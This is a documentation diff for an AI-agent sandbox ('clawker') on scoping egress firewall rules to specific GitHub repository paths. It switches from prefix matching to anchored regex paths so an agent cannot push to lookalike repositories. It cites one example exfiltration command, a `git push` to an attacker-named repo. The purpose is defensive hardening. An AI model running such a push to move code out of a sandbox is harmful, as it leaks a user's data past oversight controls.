@@ -46,10 +46,16 @@ example, battle-tested in clawker's own `.clawker.yaml`:
   `add_domains`** — `add_domains` is an unrestricted domain allow that defeats
   the scoping. A path-scoped rule on the apex domain is what blocks
   `git push https://github.com/hackgroup/evil.git`.
-- Path rules are **prefix** matches today, so `/<owner>/<repo>` also matches
-  `/<owner>/<repo>-evil` — keep the scope tight and discover any extra
-  github.com paths the agent legitimately needs (release downloads, git deps)
-  via the monitoring loop below.
+- Path rules are **prefix** matches by default, so `/<owner>/<repo>` also matches
+  `/<owner>/<repo>-evil`. On a host where the path embeds a name you don't control
+  (`/<owner>/...`) that gap is exploitable. To close it, prefix the path with `~`
+  to match it as an **anchored regex** (exact, both ends), e.g.
+  `~/<owner>/<repo>(/.*)?` to scope to that repo and its subtree only, or
+  `~/repos/(<owner>|<other>)/?` for an exact set. The trailing slash is
+  significant (`~/x` ≠ `~/x/`), so match the form(s) the host serves (`/?` or
+  `(/.*)?` accepts both). An invalid path fails the whole add/refresh rather than
+  loosening the rule. Still discover any extra github.com paths the agent
+  legitimately needs (release downloads, git deps) via the monitoring loop below.
 
 - **Always include `/anthropics/claude-code/`** — covers Claude Code's
   auto-update checks and related API calls; omitting it breaks updates inside the agent.
